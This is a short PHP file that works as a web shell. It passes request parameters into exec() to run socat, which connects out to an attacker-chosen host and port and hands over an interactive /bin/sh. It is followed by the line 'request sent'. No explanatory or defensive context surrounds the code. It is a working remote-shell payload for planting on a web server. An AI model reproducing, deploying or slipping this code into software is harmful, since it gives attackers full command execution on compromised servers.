<?php
  exec('socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/sh,pty,stderr,setsid,sigint,sane &');
?>
request sent
